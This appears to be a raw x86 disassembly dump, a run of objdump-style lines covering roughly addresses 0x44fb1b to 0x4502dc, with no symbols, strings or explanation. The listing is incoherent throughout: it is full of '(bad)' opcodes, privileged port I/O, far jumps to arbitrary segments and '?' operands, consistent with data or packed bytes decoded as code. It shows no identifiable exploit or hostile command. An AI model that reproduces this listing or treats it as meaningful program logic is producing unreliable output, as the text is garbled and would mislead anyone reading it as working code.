  44fb1b:	adc    ecx,esp
  44fb1d:	xchg   esp,eax
  44fb1e:	push   ds
  44fb1f:	xor    eax,0xd5b6745e
  44fb24:	test   DWORD PTR ds:0xd2666d11,eax
  44fb2a:	hlt    
  44fb2b:	test   DWORD PTR [edi-0x63051b09],eax
  44fb31:	mov    bl,0xbf
  44fb33:	lds    ecx,FWORD PTR [esi]
  44fb35:	mov    esi,0xda34d495
  44fb3a:	xchg   ebp,eax
  44fb3b:	mov    ebp,DWORD PTR [edx]
  44fb3d:	ins    BYTE PTR es:[edi],dx
  44fb3e:	xchg   edi,eax
  44fb3f:	fwait
  44fb40:	mov    DWORD PTR [edi+0x35eec363],edi
  44fb46:	cwde   
  44fb47:	or     edx,0x2
  44fb4a:	push   cs
  44fb4b:	xchg   esi,eax
  44fb4c:	or     DWORD PTR fs:[esi],ebx
  44fb4f:	cmovae ebp,DWORD PTR [ebp+0x69]
  44fb53:	dec    ecx
  44fb54:	sti    
  44fb55:	and    edx,DWORD PTR [edi+0x30]
  44fb58:	mov    edi,DWORD PTR [ecx+0x243668a2]
  44fb5e:	(bad)  
  44fb5f:	in     al,dx
  44fb60:	sbb    eax,DWORD PTR [ebx]
  44fb62:	inc    esi
  44fb63:	out    dx,eax
  44fb64:	dec    ebp
  44fb65:	mov    DWORD PTR [ecx-0x59a5640b],edi
  44fb6b:	mov    ch,0x46
  44fb6d:	ret    0x491f
  44fb70:	sti    
  44fb71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fb72:	in     al,0x7a
  44fb74:	adc    DWORD PTR [edi-0xc],edx
  44fb77:	call   0x388f0148
  44fb7c:	sbb    ch,al
  44fb7e:	mov    al,cl
  44fb80:	mov    BYTE PTR [ebx],dl
  44fb82:	mov    al,0xbe
  44fb84:	mov    ds:0x64945ddf,eax
  44fb89:	add    ch,BYTE PTR [eax-0x62]
  44fb8c:	adc    DWORD PTR [eax-0x5509752a],0x594c7d1f
  44fb96:	mov    ecx,0xb78b583c
  44fb9b:	aad    0x16
  44fb9d:	cmp    DWORD PTR [ebx-0x490afed7],ecx
  44fba3:	or     cl,BYTE PTR [eax-0x66c90c59]
  44fba9:	cmp    al,0x1d
  44fbab:	sbb    ah,BYTE PTR [esi+0x2]
  44fbae:	cli    
  44fbaf:	mov    dl,0x73
  44fbb1:	je     0x44fb3f
  44fbb3:	push   ds
  44fbb4:	inc    eax
  44fbb5:	pop    ecx
  44fbb6:	es jge 0x44fb42
  44fbb9:	gs pop esi
  44fbbb:	inc    esp
  44fbbc:	cdq    
  44fbbd:	or     edx,ebp
  44fbbf:	mov    ds:0xe7d002ae,al
  44fbc4:	push   ds
  44fbc5:	sbb    DWORD PTR [ebx+ecx*2-0x3a],ebx
  44fbc9:	mov    ebx,0xfa81bd67
  44fbce:	in     eax,dx
  44fbcf:	jecxz  0x44fbda
  44fbd1:	add    eax,0x20e1ed3
  44fbd6:	mov    esp,0xfd35f829
  44fbdb:	fidivr DWORD PTR [eax+eiz*2+0x5f69f99]
  44fbe2:	dec    edi
  44fbe3:	imul   eax,DWORD PTR [edi],0x6f
  44fbe6:	add    dh,BYTE PTR [edx+0x7c981463]
  44fbec:	mov    bh,0x6
  44fbee:	sub    eax,0xe97eb597
  44fbf3:	mov    esp,0x96c5388
  44fbf8:	(bad)  
  44fbf9:	lods   eax,DWORD PTR ds:[esi]
  44fbfa:	shl    ebx,1
  44fbfc:	sbb    eax,0xff098003
  44fc01:	push   esi
  44fc02:	ret    0xe84
  44fc05:	clc    
  44fc06:	sbb    eax,0x80bf88ce
  44fc0b:	adc    eax,0xbc0a4211
  44fc10:	cmp    bh,ah
  44fc12:	push   cs
  44fc13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fc14:	popa   
  44fc15:	ins    DWORD PTR es:[edi],dx
  44fc16:	mov    ebx,ebx
  44fc18:	ja     0x44fc3d
  44fc1a:	test   BYTE PTR [ecx-0x326a10ff],bl
  44fc20:	adc    eax,DWORD PTR [ebx]
  44fc22:	xor    BYTE PTR [edx+0x2d3047fc],bl
  44fc28:	leave  
  44fc29:	inc    edi
  44fc2a:	enter  0xb134,0x82
  44fc2e:	inc    edx
  44fc2f:	sbb    eax,DWORD PTR [ebx-0x77ef6071]
  44fc35:	bswap  esi
  44fc37:	pop    ds
  44fc38:	dec    esi
  44fc39:	sahf   
  44fc3a:	shr    BYTE PTR [esi-0x47],1
  44fc3d:	dec    ecx
  44fc3e:	nop
  44fc3f:	jl     0x44fca4
  44fc41:	sub    BYTE PTR [esi+0x5f],0x14
  44fc45:	sub    BYTE PTR [esi+0x76],al
  44fc48:	mov    BYTE PTR [ebp-0x11adbd83],ah
  44fc4e:	mov    esi,0x7191cc18
  44fc53:	adc    eax,0xa37b2b7b
  44fc58:	or     BYTE PTR [edi+0x7c92d6fe],bh
  44fc5e:	push   ebp
  44fc5f:	add    DWORD PTR [eax+0x31],ecx
  44fc62:	(bad)  
  44fc63:	aad    0xd
  44fc65:	fimul  DWORD PTR [eax-0xe]
  44fc68:	pop    es
  44fc69:	dec    edi
  44fc6a:	jne    0x44fbf1
  44fc6c:	mov    BYTE PTR [edi-0x5e],dl
  44fc6f:	or     BYTE PTR [ebp+ecx*1-0x75],dh
  44fc73:	add    ebp,DWORD PTR [edi]
  44fc75:	add    bh,dl
  44fc77:	out    dx,eax
  44fc78:	out    dx,al
  44fc79:	ja     0x44fc04
  44fc7b:	sub    eax,0xa71fd422
  44fc80:	pop    edi
  44fc81:	aam    0x4a
  44fc83:	push   eax
  44fc84:	jo     0x44fc56
  44fc86:	(bad)  
  44fc88:	or     BYTE PTR [eax+0x17b9b2e0],ah
  44fc8e:	adc    eax,edx
  44fc90:	mov    gs,WORD PTR [edi]
  44fc92:	push   ecx
  44fc93:	fmul   st(6),st
  44fc95:	mov    ch,BYTE PTR [edx+0x4]
  44fc98:	cld    
  44fc99:	and    eax,0x3fbc094
  44fc9e:	lods   al,BYTE PTR ds:[esi]
  44fc9f:	iret   
  44fca0:	aam    0xfd
  44fca2:	pushf  
  44fca3:	add    BYTE PTR [ebp-0x5e],al
  44fca6:	loop   0x44fd1c
  44fca8:	mov    BYTE PTR [ecx+0x1156409f],al
  44fcae:	or     al,0xa9
  44fcb0:	mov    ds:0x1432c605,al
  44fcb5:	sub    BYTE PTR [ecx+0x5f],ah
  44fcb8:	push   ebp
  44fcb9:	add    bh,BYTE PTR [ebp-0x29]
  44fcbc:	ins    BYTE PTR es:[edi],dx
  44fcbd:	cmp    edi,edx
  44fcbf:	aad    0x67
  44fcc1:	aad    0x42
  44fcc3:	dec    eax
  44fcc4:	pop    esi
  44fcc5:	add    esp,DWORD PTR [eax+0xf924c0d]
  44fccb:	ret    0xdb2e
  44fcce:	pusha  
  44fccf:	lea    ebp,[eax-0x3f51d1d]
  44fcd5:	test   eax,0xf6d5bb25
  44fcda:	das    
  44fcdb:	jbe    0x44fce6
  44fcdd:	jns    0x44fd53
  44fcdf:	sbb    ch,BYTE PTR [ecx+0x662f60c4]
  44fce5:	int    0xd9
  44fce7:	xor    dh,ch
  44fce9:	sbb    DWORD PTR [edi+ebx*8],0x28
  44fced:	add    ah,BYTE PTR [edi+eiz*8]
  44fcf0:	std    
  44fcf1:	outs   dx,BYTE PTR ds:[esi]
  44fcf2:	imul   ebx,DWORD PTR gs:[eax+0x52],0x1e
  44fcf7:	std    
  44fcf8:	repz jmp 0xb81f812f
  44fcfe:	(bad)  
  44fcff:	xlat   BYTE PTR ds:[ebx]
  44fd00:	test   DWORD PTR [edi],edx
  44fd02:	daa    
  44fd03:	ret    0xd60e
  44fd06:	mov    WORD PTR [ebp+0x5b1fe826],ss
  44fd0c:	sub    eax,0xa6bbb453
  44fd11:	fiadd  DWORD PTR [esi]
  44fd13:	inc    esp
  44fd14:	loop   0x44fd18
  44fd16:	jmp    0x2999:0x31d513fb
  44fd1d:	mov    al,ds:0x7f9d160
  44fd22:	(bad)  
  44fd23:	out    dx,al
  44fd24:	xchg   ebx,eax
  44fd25:	nop
  44fd26:	stos   DWORD PTR es:[edi],eax
  44fd27:	inc    edx
  44fd28:	fcomi  st,st(2)
  44fd2a:	pusha  
  44fd2b:	adc    eax,0xd1fa38ca
  44fd30:	push   cs
  44fd31:	shl    BYTE PTR [ebp-0x57],cl
  44fd34:	pop    edi
  44fd35:	mov    DWORD PTR [ebp-0x3f],esi
  44fd38:	in     al,dx
  44fd39:	repnz (bad) 
  44fd3b:	cmp    eax,0xe58058f
  44fd40:	adc    eax,0xb022b249
  44fd45:	or     al,0x71
  44fd47:	ins    DWORD PTR es:[edi],dx
  44fd48:	call   0xef51:0x48d44255
  44fd4f:	cmc    
  44fd50:	cli    
  44fd51:	pop    ss
  44fd52:	(bad)  
  44fd53:	int    0x4f
  44fd55:	cmp    DWORD PTR [ecx],eax
  44fd57:	xchg   edi,eax
  44fd58:	stos   BYTE PTR es:[edi],al
  44fd59:	jge    0x44fdcb
  44fd5b:	fcomi  st,st(1)
  44fd5d:	(bad)  
  44fd5e:	lock mov edx,0x145f5809
  44fd64:	or     eax,0xd39fc33c
  44fd69:	sbb    esi,DWORD PTR [esp+0x7883906c]
  44fd70:	call   0x911a5d0b
  44fd75:	out    0x19,eax
  44fd77:	addr16 cmp ah,dh
  44fd7a:	cld    
  44fd7b:	mov    dh,BYTE PTR [ebp+0xeec171b]
  44fd81:	xchg   esi,eax
  44fd82:	ins    DWORD PTR es:[edi],dx
  44fd83:	jb     0x44fdc5
  44fd85:	adc    ebp,DWORD PTR [edi]
  44fd87:	pop    ecx
  44fd88:	dec    eax
  44fd89:	add    al,BYTE PTR [eax-0x6f]
  44fd8c:	jge    0x44fdcd
  44fd8e:	push   esp
  44fd8f:	std    
  44fd90:	mov    edi,0x9f0f1f18
  44fd95:	or     eax,0x87b61f07
  44fd9a:	jnp    0x44fd71
  44fd9c:	std    
  44fd9d:	jns    0x44fde8
  44fd9f:	lahf   
  44fda0:	gs xor eax,0xbf88ec46
  44fda6:	sub    bl,BYTE PTR [ecx+0x24]
  44fda9:	addr16 nop
  44fdab:	aaa    
  44fdac:	fadd   DWORD PTR [edx]
  44fdae:	jbe    0x44fe2c
  44fdb0:	pop    eax
  44fdb1:	jmp    0x44fd8c
  44fdb3:	fsubr  DWORD PTR [edi+0x15]
  44fdb6:	push   ds
  44fdb7:	or     ecx,esi
  44fdb9:	mov    eax,ds:0x29f2c619
  44fdbe:	int    0xd4
  44fdc0:	aad    0xd3
  44fdc2:	xchg   esi,eax
  44fdc3:	int3   
  44fdc4:	push   cs
  44fdc5:	inc    esi
  44fdc6:	call   0x1ba0:0x30bb8883
  44fdcd:	dec    ecx
  44fdce:	(bad)  
  44fdcf:	mov    ds:0xe95d893f,eax
  44fdd4:	mov    DWORD PTR [ebx],esp
  44fdd6:	push   ebx
  44fdd7:	mov    esp,0xbc0a1130
  44fddc:	mov    eax,0xb98f1f18
  44fde1:	xchg   BYTE PTR [ecx+eax*8],al
  44fde4:	int3   
  44fde5:	dec    esp
  44fde6:	adc    dl,bh
  44fde8:	xchg   edx,eax
  44fde9:	mov    DWORD PTR cs:[edx-0x674297ee],esi
  44fdf0:	mov    BYTE PTR [ebx+0x79],bl
  44fdf3:	(bad)  
  44fdf4:	out    dx,eax
  44fdf5:	push   esp
  44fdf6:	cdq    
  44fdf7:	dec    ebp
  44fdf8:	adc    ah,bh
  44fdfa:	into   
  44fdfb:	aam    0x8c
  44fdfd:	cmp    DWORD PTR [edx+0x64],ecx
  44fe00:	or     eax,0x8bd8d9fa
  44fe05:	test   DWORD PTR [eax+edi*1-0x32],ebp
  44fe09:	int    0x88
  44fe0b:	cdq    
  44fe0c:	dec    eax
  44fe0d:	call   0xc0b7:0x63fed5c4
  44fe14:	jp     0x44fe15
  44fe16:	jl     0x44fe82
  44fe18:	fwait
  44fe19:	mov    ebp,0x32522bb
  44fe1e:	shl    DWORD PTR [esp+ebp*1+0x43],1
  44fe22:	or     bl,dh
  44fe24:	fistp  WORD PTR [eax+eax*4]
  44fe27:	jmp    0x7b28:0xe6e9a60b
  44fe2e:	mov    al,0x3e
  44fe30:	mov    ch,0xcf
  44fe32:	add    BYTE PTR ds:0xbca21b8d,ch
  44fe38:	mov    ds:0xc9fc6082,eax
  44fe3d:	bound  ebp,QWORD PTR [edi-0xa]
  44fe40:	mov    edx,0xd8da3400
  44fe45:	and    eax,0x95b8f01a
  44fe4a:	cs (bad) 
  44fe4c:	mov    ah,BYTE PTR [ebp-0x6f23f657]
  44fe52:	rcr    BYTE PTR [esi+0x68],0xe0
  44fe56:	jecxz  0x44fe9c
  44fe58:	stc    
  44fe59:	add    ah,BYTE PTR [edx]
  44fe5b:	shr    al,1
  44fe5d:	stos   BYTE PTR es:[edi],al
  44fe5e:	sbb    eax,0x619d360c
  44fe63:	jmp    0x44fe2d
  44fe65:	cmp    al,0x0
  44fe67:	cli    
  44fe68:	test   DWORD PTR [edx],ebx
  44fe6a:	fstp   QWORD PTR cs:[edx]
  44fe6d:	pop    es
  44fe6e:	(bad)  
  44fe6f:	aam    0xdb
  44fe71:	cmp    esp,0x1b
  44fe74:	cdq    
  44fe75:	adc    BYTE PTR [edx+0x36],0x88
  44fe79:	imul   ebx,edx,0x4fe2165c
  44fe7f:	jecxz  0x44fecb
  44fe81:	add    dl,BYTE PTR [esi-0x48]
  44fe84:	push   ss
  44fe85:	xlat   BYTE PTR ds:[ebx]
  44fe86:	fidivr DWORD PTR [edi+edi*4-0x1]
  44fe8a:	sbb    ebx,DWORD PTR [esi+0x2fb05d88]
  44fe90:	xor    DWORD PTR [ecx],esi
  44fe92:	add    al,0x87
  44fe94:	cmp    BYTE PTR ds:0x7e892540,ch
  44fe9a:	jge    0x44fea1
  44fe9c:	(bad)  
  44fe9d:	sar    BYTE PTR [edx+0x12],1
  44fea0:	test   al,0x58
  44fea2:	sbb    al,0xf1
  44fea4:	mov    dl,0x7b
  44fea6:	or     edi,ebp
  44fea8:	test   BYTE PTR ds:0x27cf62c5,0x33
  44feaf:	or     cl,BYTE PTR [esi]
  44feb1:	push   edi
  44feb2:	add    ah,al
  44feb4:	fcomp  DWORD PTR [esp+esi*4]
  44feb7:	jmp    0xd4afd777
  44febc:	into   
  44febd:	retf   0x9267
  44fec0:	mov    dl,BYTE PTR [ebx]
  44fec2:	jg     0x44ff10
  44fec4:	xor    al,0x26
  44fec6:	(bad)  
  44feca:	fstp   QWORD PTR [edx-0x35]
  44fecd:	sub    ebx,DWORD PTR [edi]
  44fecf:	and    al,0x5d
  44fed1:	xchg   ecx,eax
  44fed2:	ja     0x44fed5
  44fed4:	enter  0x1498,0x4f
  44fed8:	push   0xc27fc085
  44fedd:	jb     0x44fefe
  44fedf:	mov    bh,0xbe
  44fee1:	mov    esp,0x74628cdf
  44fee6:	fidivr DWORD PTR [eax-0x691d2967]
  44feec:	dec    eax
  44feed:	push   edi
  44feee:	mov    cl,0x1f
  44fef0:	cmp    DWORD PTR [edi+ebx*1],0x54547abd
  44fef7:	dec    ebp
  44fef8:	hlt    
  44fef9:	mov    ds:0x7f2d2fa,eax
  44fefe:	cdq    
  44feff:	in     al,0x60
  44ff01:	retf   
  44ff02:	mov    al,0x88
  44ff04:	or     ch,dl
  44ff06:	outs   dx,BYTE PTR ds:[esi]
  44ff07:	cdq    
  44ff08:	add    edi,DWORD PTR [edx-0x75]
  44ff0b:	jbe    0x44ff1a
  44ff0d:	cmp    BYTE PTR [edi+0x10],cl
  44ff10:	jns    0x44fe92
  44ff12:	or     al,0xe8
  44ff14:	push   eax
  44ff15:	lods   eax,DWORD PTR ds:[esi]
  44ff16:	inc    edi
  44ff17:	aam    0xa1
  44ff19:	daa    
  44ff1a:	adc    al,dh
  44ff1c:	jbe    0x44feb0
  44ff1e:	into   
  44ff1f:	repnz mov ecx,DWORD PTR [edi+0x28b217e9]
  44ff26:	loopne 0x44fed4
  44ff28:	push   eax
  44ff29:	jge    0x44feb7
  44ff2b:	aad    0xa3
  44ff2d:	adc    eax,eax
  44ff2f:	cwde   
  44ff30:	cmp    DWORD PTR [edx-0x874bf60],0xffffff8a
  44ff37:	pop    edx
  44ff38:	xchg   DWORD PTR [edi-0x3ac80951],ecx
  44ff3e:	loopne 0x44fecc
  44ff40:	sub    dl,BYTE PTR [esi+0x58]
  44ff43:	aam    0x94
  44ff45:	fstp   QWORD PTR [edx]
  44ff47:	and    esp,DWORD PTR [ecx]
  44ff49:	adc    al,0x77
  44ff4b:	sbb    ebp,DWORD PTR [eax+0x11]
  44ff4e:	push   ds
  44ff4f:	repz mov edx,0xdc2cac3e
  44ff55:	fiadd  DWORD PTR [ebx-0x16bf982b]
  44ff5b:	int    0x44
  44ff5d:	pop    eax
  44ff5e:	mov    DWORD PTR [ebx-0x77],edi
  44ff61:	mov    DWORD PTR [ecx],esp
  44ff63:	push   ebp
  44ff64:	mov    esp,0x9e04b41c
  44ff69:	aad    0xb6
  44ff6b:	shr    DWORD PTR [ebp-0x3b],cl
  44ff6e:	addr16 shl bl,1
  44ff71:	cmp    eax,0xd77e427f
  44ff76:	or     esi,DWORD PTR [esi-0x2a2ac001]
  44ff7c:	sbb    eax,0x4a82333f
  44ff81:	pop    ds
  44ff82:	jl     0x44ff59
  44ff84:	jmp    0x44ff29
  44ff86:	sub    eax,0x9a56c799
  44ff8b:	sub    esi,DWORD PTR [ecx+0x6d]
  44ff8e:	dec    esi
  44ff8f:	inc    ebx
  44ff90:	dec    ebp
  44ff91:	outs   dx,BYTE PTR ds:[esi]
  44ff92:	fwait
  44ff93:	(bad)  
  44ff94:	fld    DWORD PTR ds:0x14823146
  44ff9a:	in     eax,dx
  44ff9b:	dec    eax
  44ff9c:	enter  0x50ca,0x78
  44ffa0:	mov    bl,bh
  44ffa2:	cli    
  44ffa3:	jo     0x45000c
  44ffa5:	add    BYTE PTR ds:0x420257bf,cl
  44ffab:	les    edi,FWORD PTR [esi]
  44ffad:	cdq    
  44ffae:	nop
  44ffaf:	mov    ebp,0x5b6d23ed
  44ffb4:	fisubr DWORD PTR [eax+0x5d6549b]
  44ffba:	xchg   esp,eax
  44ffbb:	sub    DWORD PTR [eax-0x33],ebp
  44ffbe:	loop   0x44ff7a
  44ffc0:	adc    DWORD PTR [ebx+0x24],esi
  44ffc3:	adc    BYTE PTR [ecx+0x73e95b6d],cl
  44ffc9:	push   ebx
  44ffca:	pop    esp
  44ffcb:	scas   eax,DWORD PTR es:[edi]
  44ffcc:	sbb    eax,0x2b149e5f
  44ffd1:	mov    WORD PTR [edi],?
  44ffd3:	sbb    eax,0x4c5e1b5b
  44ffd8:	(bad)  
  44ffd9:	sub    BYTE PTR [ecx-0x159a71ac],bh
  44ffdf:	mov    eax,0x72171196
  44ffe4:	jp     0x44ffdb
  44ffe6:	outs   dx,BYTE PTR ds:[esi]
  44ffe7:	sub    ebx,DWORD PTR [edx-0x66]
  44ffea:	inc    eax
  44ffeb:	xor    esp,ebp
  44ffed:	adc    eax,DWORD PTR [edi-0x2d]
  44fff0:	call   0x30a8d49c
  44fff5:	or     dh,al
  44fff7:	mov    al,ds:0x5dcfd19b
  44fffc:	mov    dh,0x5
  44fffe:	sahf   
  44ffff:	xlat   BYTE PTR ds:[ebx]
  450000:	pop    edi
  450001:	push   ebx
  450002:	dec    ecx
  450003:	in     al,dx
  450004:	in     eax,0x17
  450006:	mov    dh,0x34
  450008:	cmp    eax,0x7fd4ab67
  45000d:	fucomp st(5)
  45000f:	int3   
  450010:	mov    BYTE PTR [ebp-0x3b],ah
  450013:	mov    al,ds:0x9a7d823d
  450018:	mov    dl,0x5
  45001a:	xchg   esi,eax
  45001b:	shl    ebx,1
  45001d:	arpl   WORD PTR [ecx-0x16],bx
  450020:	pop    edi
  450021:	das    
  450022:	pop    ds
  450023:	gs jae 0x44ffda
  450026:	mov    al,ds:0xf88b52ff
  45002b:	aam    0x68
  45002d:	xchg   edx,eax
  45002e:	pop    es
  45002f:	xor    al,0xe7
  450031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450032:	icebp  
  450033:	push   eax
  450034:	mov    ebx,edi
  450036:	aam    0xb3
  450038:	xor    BYTE PTR [ebp+0x7bc854b4],dh
  45003e:	xchg   BYTE PTR [esi-0x2b5773f1],ah
  450044:	mov    edi,eax
  450046:	cld    
  450047:	stc    
  450048:	imul   ebp,esi,0x1f
  45004b:	cmp    esp,DWORD PTR [ebp+ebx*1-0x57370e4d]
  450052:	retf   
  450053:	aam    0x2e
  450055:	adc    al,0x6b
  450057:	add    cl,bl
  450059:	push   edx
  45005a:	mov    esi,0x9a6d88bc
  45005f:	into   
  450060:	mov    eax,0x45b9c9e4
  450065:	sbb    eax,0x49b1b798
  45006a:	rol    BYTE PTR [ebx-0x68],cl
  45006d:	outs   dx,BYTE PTR ds:[esi]
  45006e:	std    
  45006f:	sbb    al,ch
  450071:	sar    BYTE PTR [esi+0x43],1
  450074:	jae    0x450066
  450076:	sbb    dl,BYTE PTR [edi-0x157492d5]
  45007c:	jg     0x450081
  45007e:	xchg   esi,eax
  45007f:	mov    eax,ds:0xa2c8c027
  450084:	sub    al,0x4f
  450086:	pop    ds
  450087:	jmp    0xc0a2fe37
  45008c:	jp     0x45000f
  45008e:	push   ds
  45008f:	aam    0x72
  450091:	enter  0x7b55,0xeb
  450095:	cdq    
  450096:	xchg   ebx,eax
  450097:	mov    bl,0x89
  450099:	xor    eax,DWORD PTR [ecx+0xa1ec1fc]
  45009f:	addr16 xchg esi,eax
  4500a1:	inc    edi
  4500a2:	sbb    al,0x7e
  4500a4:	in     al,0x2
  4500a6:	lea    ebp,[ebp-0x5770ea9a]
  4500ac:	mov    DWORD PTR [ecx-0x7a],esp
  4500af:	repnz and dh,BYTE PTR [ecx+0x2130bd8]
  4500b6:	mov    dl,0xe4
  4500b8:	push   es
  4500b9:	(bad)  
  4500ba:	je     0x450121
  4500bc:	xor    al,BYTE PTR [ebx+0xe51871f]
  4500c2:	dec    eax
  4500c3:	clc    
  4500c4:	mov    WORD PTR [esi-0x4ca361b3],gs
  4500ca:	mov    ah,0x54
  4500cc:	cmc    
  4500cd:	leave  
  4500ce:	test   DWORD PTR [edi],ebx
  4500d0:	inc    esp
  4500d1:	aaa    
  4500d2:	push   ds
  4500d3:	lahf   
  4500d4:	adc    BYTE PTR [ebx-0x42],cl
  4500d7:	mov    esi,?
  4500d9:	sbb    dh,BYTE PTR [ecx-0x7ef2b529]
  4500df:	popa   
  4500e0:	jae    0x45006b
  4500e2:	pop    edx
  4500e3:	les    esp,FWORD PTR [ebx]
  4500e5:	add    bh,BYTE PTR [eax+0x6a]
  4500e8:	les    edx,FWORD PTR ds:0x26f58ec
  4500ee:	cmp    cl,BYTE PTR [edi]
  4500f0:	gs sar esi,0xb3
  4500f4:	std    
  4500f5:	(bad)  
  4500f6:	pusha  
  4500f7:	sub    eax,0x6afff89f
  4500fc:	cmp    bh,bh
  4500fe:	popa   
  4500ff:	aad    0x99
  450101:	sbb    ch,BYTE PTR [edx-0x15e8a87c]
  450107:	or     BYTE PTR [eax+0x3477d2f9],cl
  45010d:	jno    0x450179
  45010f:	xor    al,0x44
  450111:	add    eax,DWORD PTR [ecx+eax*4-0x78]
  450115:	(bad)  
  450116:	sti    
  450117:	pop    esi
  450118:	lods   eax,DWORD PTR ds:[esi]
  450119:	fcomp  QWORD PTR [edi]
  45011b:	jae    0x4500aa
  45011d:	jmp    FWORD PTR [edx+ebp*2-0x2b9fbe72]
  450124:	jmp    FWORD PTR [esi]
  450126:	loopne 0x45016f
  450128:	inc    esi
  450129:	mov    ds:0x7f9734a3,eax
  45012e:	lock mov eax,0xb04082ac
  450134:	jo     0x4500c1
  450136:	outs   dx,DWORD PTR ds:[esi]
  450137:	call   0x5f83:0xd4475454
  45013e:	shr    BYTE PTR [ebx-0x166f83a7],1
  450144:	sbb    BYTE PTR [edx],al
  450146:	imul   ecx,DWORD PTR [esp+edx*1+0x0],0x2d1813d
  45014e:	fcom   QWORD PTR ds:0xa21e7bda
  450154:	cli    
  450155:	xchg   sp,ax
  450157:	pop    ds
  450158:	jmp    0x45015f
  45015a:	sub    bh,BYTE PTR [edi]
  45015c:	and    DWORD PTR [ecx+0x2e63ba7],ecx
  450162:	and    DWORD PTR cs:[eax-0x7deb99dc],0x80fe0998
  45016d:	jns    0x4501e9
  45016f:	cmc    
  450170:	sub    al,al
  450172:	lahf   
  450173:	ins    BYTE PTR es:[edi],dx
  450174:	and    al,0xf1
  450176:	in     al,dx
  450177:	cmc    
  450178:	mov    ds:0x3bf47c00,eax
  45017d:	xchg   ebp,eax
  45017e:	xchg   ebp,eax
  450180:	pushf  
  450181:	add    ah,BYTE PTR [edi]
  450183:	cld    
  450184:	and    al,0xf6
  450186:	sub    eax,DWORD PTR [bx-0x67fe]
  45018b:	pop    ebp
  45018c:	sbb    al,0xc7
  45018e:	loope  0x4501b7
  450190:	add    edx,DWORD PTR [edi+0x573d6560]
  450196:	jbe    0x45011d
  450198:	jo     0x450151
  45019a:	and    al,0xd7
  45019c:	lods   eax,DWORD PTR ds:[esi]
  45019d:	sbb    BYTE PTR [ecx+0x11077e58],dh
  4501a3:	sub    cl,BYTE PTR [eax-0x32f237fd]
  4501a9:	sbb    BYTE PTR [esi+edx*4-0xb3bfa80],ch
  4501b0:	addr16 call 0x9575:0x3d22bc98
  4501b8:	and    BYTE PTR [edx+ecx*1],bl
  4501bb:	aam    0xb5
  4501bd:	in     eax,dx
  4501be:	aam    0x8c
  4501c0:	ins    BYTE PTR es:[edi],dx
  4501c1:	add    bh,BYTE PTR [edx+0x7ea0f161]
  4501c7:	nop
  4501c8:	shr    DWORD PTR [edx-0xa49d0a0],1
  4501ce:	js     0x4501f2
  4501d0:	mov    ds:0xe8d546ec,al
  4501d5:	mov    dl,0x81
  4501d7:	add    eax,0x2856fdf1
  4501dc:	xchg   esp,eax
  4501dd:	inc    ecx
  4501de:	(bad)  
  4501df:	sbb    BYTE PTR [ebp+0x0],ah
  4501e2:	pop    eax
  4501e3:	sbb    al,BYTE PTR [ecx-0xe2d10a9]
  4501e9:	add    dl,BYTE PTR [edx+0x25622fda]
  4501ef:	je     0x450187
  4501f1:	and    bl,BYTE PTR [edi]
  4501f3:	popa   
  4501f4:	pop    edx
  4501f5:	or     BYTE PTR [ebx+0x1bee3033],ah
  4501fb:	aam    0xc9
  4501fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4501fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4501ff:	repz sub ah,BYTE PTR [eax+0x25b786a4]
  450206:	icebp  
  450207:	jne    0x450210
  450209:	jecxz  0x45019e
  45020b:	addr16 jbe 0x45024e
  45020e:	pop    es
  45020f:	push   ebx
  450210:	jmp    0x4501f5
  450212:	not    BYTE PTR [edx+ebp*1+0x33d4ff48]
  450219:	xchg   DWORD PTR [ecx+0x308353b8],edx
  45021f:	or     DWORD PTR [esi-0x60199869],0x86b4b24f
  450229:	dec    esi
  45022a:	int    0x98
  45022c:	in     eax,0xbe
  45022e:	out    dx,eax
  45022f:	push   ebp
  450230:	jmp    0x27ec:0xf0de716d
  450237:	xchg   DWORD PTR [ecx+0x24f6df77],ecx
  45023d:	mov    ?,esi
  45023f:	xchg   ebp,eax
  450240:	push   ecx
  450241:	dec    ecx
  450242:	dec    esp
  450243:	adc    eax,0xd773835a
  450248:	jb     0x450276
  45024a:	lahf   
  45024b:	xchg   ebx,eax
  45024c:	fwait
  45024d:	adc    DWORD PTR [edi-0x3b1cc307],0xe56add5
  450257:	in     eax,0x5
  450259:	xchg   ebp,eax
  45025a:	mov    ecx,0xb3778b94
  45025f:	shl    bl,cl
  450261:	or     bl,BYTE PTR [ebp+0x10497048]
  450267:	aam    0xc3
  450269:	leave  
  45026a:	mov    ebx,0xd2aafd36
  45026f:	jl     0x4501f9
  450271:	sub    eax,DWORD PTR [ebx+0x5cbe4dad]
  450277:	pop    eax
  450278:	adc    eax,0x60008802
  45027d:	fdivr  QWORD PTR [esi+0x60d53a02]
  450283:	pop    ebx
  450284:	(bad)  
  450285:	sti    
  450286:	shl    BYTE PTR [esi-0x23],0xd1
  45028a:	cli    
  45028b:	inc    eax
  45028c:	stos   BYTE PTR es:[edi],al
  45028d:	lea    esp,[eax-0x5]
  450290:	mov    bh,0xad
  450292:	push   0x10
  450294:	dec    ebp
  450295:	adc    DWORD PTR [edi],ebx
  450297:	lea    ebx,[ebp-0x3a]
  45029a:	out    0xe6,eax
  45029c:	or     al,0xca
  45029e:	cmc    
  45029f:	aam    0x9d
  4502a1:	cmp    eax,0xb9a84aca
  4502a6:	and    DWORD PTR [esi-0x6c],eax
  4502a9:	das    
  4502aa:	inc    ebx
  4502ab:	ret    
  4502ac:	or     BYTE PTR [bp+di+0x1c],0x18
  4502b1:	std    
  4502b2:	and    edx,edi
  4502b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4502b5:	das    
  4502b6:	mov    esp,0x445a7e22
  4502bb:	sti    
  4502bc:	mov    DWORD PTR [ecx+0x1a],esp
  4502bf:	push   esi
  4502c0:	fwait
  4502c1:	and    cl,BYTE PTR [esi+edx*8-0x2269fd97]
  4502c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4502c9:	xchg   esp,eax
  4502ca:	pop    edx
  4502cb:	xchg   esi,eax
  4502cc:	(bad)  
  4502cd:	jnp    0x4502ed
  4502cf:	out    0x3f,eax
  4502d1:	mov    dl,0xc5
  4502d3:	jg     0x45034b
  4502d5:	outs   dx,DWORD PTR ds:[esi]
  4502d6:	not    ah
  4502d8:	int    0x20
  4502da:	mov    ch,0x50
  4502dc:	arpl   WORD PTR [ecx],dx
